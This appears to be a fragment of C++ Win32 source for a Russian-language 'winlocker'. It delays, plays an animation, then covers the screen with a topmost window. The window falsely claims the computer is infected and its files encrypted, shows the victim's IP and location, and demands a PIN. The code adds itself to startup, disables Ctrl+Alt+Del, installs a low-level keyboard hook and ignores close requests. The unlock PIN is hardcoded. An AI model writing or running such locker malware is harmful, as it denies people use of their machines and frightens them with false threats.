void FlashScreen() {
    HDC hdc = GetDC(NULL);
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    for (int i = 0; i < 3; i++) {
        HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(hdc, &rect, whiteBrush);
        DeleteObject(whiteBrush);
        Sleep(30);
        HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
        FillRect(hdc, &rect, redBrush);
        DeleteObject(redBrush);
        Sleep(30);
    }
    ReleaseDC(NULL, hdc);
}

LRESULT CALLBACK AnimationWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static int currentLine = 0;
    static HFONT hFont = NULL;
    
    switch (msg) {
        case WM_CREATE: {
            hFont = CreateFontA(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, 
                                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, 
                                CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, 
                                DEFAULT_PITCH | FF_DONTCARE, "Consolas");
            SetTimer(hwnd, 1, 60, NULL);
            return 0;
        }
        
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rect;
            GetClientRect(hwnd, &rect);
            
            HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(hdc, &rect, blackBrush);
            DeleteObject(blackBrush);
            
            SetTextColor(hdc, RGB(255, 0, 0));
            SetBkMode(hdc, TRANSPARENT);
            if (hFont) SelectObject(hdc, hFont);
            
            RECT textRect;
            textRect.left = 50;
            textRect.top = rect.bottom / 4;
            textRect.right = rect.right - 50;
            textRect.bottom = rect.bottom;
            
            string fullArt;
            for (int i = 0; i <= currentLine && i < (int)asciiArt.size(); i++) {
                fullArt += asciiArt[i] + "\n";
            }
            DrawTextA(hdc, fullArt.c_str(), -1, &textRect, DT_LEFT | DT_WORDBREAK);
            EndPaint(hwnd, &ps);
            return 0;
        }
        
        case WM_TIMER: {
            if (currentLine < (int)asciiArt.size() - 1) {
                currentLine++;
                InvalidateRect(hwnd, NULL, TRUE);
                UpdateWindow(hwnd);
            } else {
                KillTimer(hwnd, 1);
                DestroyWindow(hwnd);
            }
            return 0;
        }
        
        case WM_DESTROY: {
            if (hFont) DeleteObject(hFont);
            PostQuitMessage(0);
            return 0;
        }
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
}

LRESULT CALLBACK LockerWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit, hButton;
    static HFONT hMainFont, hTextFont, hInputFont;
    static string userIP, userGeo;
    
    switch (msg) {
        case WM_CREATE: {
            userIP = GetRealIP();
            userGeo = GetGeoLocation(userIP);
            
            SetWindowLongPtr(hwnd, GWL_STYLE, WS_POPUP);
            ShowWindow(hwnd, SW_MAXIMIZE);
            
            HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
            SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND, (LONG_PTR)blackBrush);
            
            HMENU hMenu = GetSystemMenu(hwnd, FALSE);
            if (hMenu) {
                EnableMenuItem(hMenu, SC_CLOSE, MF_GRAYED);
                EnableMenuItem(hMenu, SC_MOVE, MF_GRAYED);
                EnableMenuItem(hMenu, SC_MINIMIZE, MF_GRAYED);
                EnableMenuItem(hMenu, SC_MAXIMIZE, MF_GRAYED);
            }
            
            hMainFont = CreateFontW(96, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                                    CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                                    DEFAULT_PITCH | FF_DONTCARE, L"MS Gothic");
            
            hTextFont = CreateFontW(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                                    CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                                    DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
            
            hInputFont = CreateFontW(36, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                     DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                                     CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                                     DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
            
            int sw = GetSystemMetrics(SM_CXSCREEN);
            
            HWND hTitle = CreateWindowW(L"STATIC", L"!!! ВНИМАНИЕ !!!",
                WS_VISIBLE | WS_CHILD | SS_CENTER,
                0, 50, sw, 120, hwnd, NULL, NULL, NULL);
            SendMessage(hTitle, WM_SETFONT, (WPARAM)hMainFont, TRUE);
            
            wstring message = 
                L"\n[ СИСТЕМА ЗАБЛОКИРОВАНА ]\n\n"
                L"Ваш компьютер заражён вирусом \"СПИД\"\n"
                L"Все файлы зашифрованы\n\n"
                L"════════════════════════════════════════\n\n"
                L"IP: " + wstring(userIP.begin(), userIP.end()) + L"\n"
                L"ЛОКАЦИЯ: " + wstring(userGeo.begin(), userGeo.end()) + L"\n\n"
                L"════════════════════════════════════════\n\n"
                L"ДЛЯ РАЗБЛОКИРОВКИ ВВЕДИТЕ ПИН-КОД:\n";
            
            HWND hText = CreateWindowW(L"STATIC", message.c_str(),
                WS_VISIBLE | WS_CHILD | SS_CENTER,
                50, 180, sw - 100, 400, hwnd, NULL, NULL, NULL);
            SendMessage(hText, WM_SETFONT, (WPARAM)hTextFont, TRUE);
            
            hEdit = CreateWindowW(L"EDIT", L"",
                WS_VISIBLE | WS_CHILD | WS_BORDER | ES_CENTER | ES_PASSWORD,
                sw / 2 - 150, 580, 300, 60, hwnd, (HMENU)1001, NULL, NULL);
            SendMessage(hEdit, WM_SETFONT, (WPARAM)hInputFont, TRUE);
            
            hButton = CreateWindowW(L"BUTTON", L"[ РАЗБЛОКИРОВАТЬ ]",
                WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                sw / 2 - 120, 670, 240, 60, hwnd, (HMENU)1002, NULL, NULL);
            SendMessage(hButton, WM_SETFONT, (WPARAM)hInputFont, TRUE);
            
            AddToStartup();
            DisableCtrlAltDel();
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
            
            SetForegroundWindow(hwnd);
            SetFocus(hwnd);
            
            return 0;
        }
        
        case WM_CTLCOLORSTATIC: {
            HDC hdcStatic = (HDC)wParam;
            SetTextColor(hdcStatic, RGB(255, 0, 0));
            SetBkColor(hdcStatic, RGB(0, 0, 0));
            SetBkMode(hdcStatic, TRANSPARENT);
            return (LRESULT)GetStockObject(NULL_BRUSH);
        }
        
        case WM_CTLCOLOREDIT: {
            HDC hdcEdit = (HDC)wParam;
            SetTextColor(hdcEdit, RGB(255, 255, 255));
            SetBkColor(hdcEdit, RGB(30, 0, 0));
            return (LRESULT)CreateSolidBrush(RGB(30, 0, 0));
        }
        
        case WM_CTLCOLORBTN: {
            HDC hdcBtn = (HDC)wParam;
            SetTextColor(hdcBtn, RGB(255, 0, 0));
            SetBkColor(hdcBtn, RGB(20, 0, 0));
            return (LRESULT)CreateSolidBrush(RGB(20, 0, 0));
        }
        
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1002) {
                wchar_t buffer[10];
                GetWindowTextW(hEdit, buffer, 10);
                wstring pin = buffer;
                
                // НОВЫЙ ПИН-КОД: 386893
                if (pin == L"386893") {
                    blockKeys = false;
                    if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
                    EnableCtrlAltDel();
                    FullSystemRestore();
                    DestroyWindow(hwnd);
                } else {
                    FlashScreen();
                    MessageBoxW(hwnd, L"НЕВЕРНЫЙ ПИН-КОД!", 
                                L"ОШИБКА", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
                    SetWindowTextW(hEdit, L"");
                    SetFocus(hEdit);
                }
                return 0;
            }
            break;
        }
        
        case WM_CLOSE:
            return 0;
            
        case WM_DESTROY: {
            DeleteObject(hMainFont);
            DeleteObject(hTextFont);
            DeleteObject(hInputFont);
            PostQuitMessage(0);
            return 0;
        }
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
    srand(static_cast<unsigned int>(time(nullptr)));
    
    // Задержка 3 секунды для теста (поменяй на 60 + rand()%61)
    int delaySeconds = 3;
    Sleep(delaySeconds * 1000);
    
    // АНИМАЦИЯ
    WNDCLASSEXW wcAnim = {};
    wcAnim.cbSize = sizeof(WNDCLASSEXW);
    wcAnim.lpfnWndProc = AnimationWndProc;
    wcAnim.hInstance = hInstance;
    wcAnim.lpszClassName = L"AnimationClass";
    wcAnim.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
    RegisterClassExW(&wcAnim);
    
    HWND hwndAnim = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"AnimationClass", L"", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);
    
    ShowWindow(hwndAnim, SW_SHOW);
    UpdateWindow(hwndAnim);
    
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // ВИНЛОКЕР
    WNDCLASSEXW wcLock = {};
    wcLock.cbSize = sizeof(WNDCLASSEXW);
    wcLock.lpfnWndProc = LockerWndProc;
    wcLock.hInstance = hInstance;
    wcLock.lpszClassName = L"LockerClass";
    wcLock.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
    wcLock.hIcon = LoadIcon(NULL, IDI_ERROR);
    wcLock.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassExW(&wcLock);
    
    HWND hwndLock = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"LockerClass", L"", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);
    
    ShowWindow(hwndLock, SW_SHOW);
    UpdateWindow(hwndLock);
    SetForegroundWindow(hwndLock);
    
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}
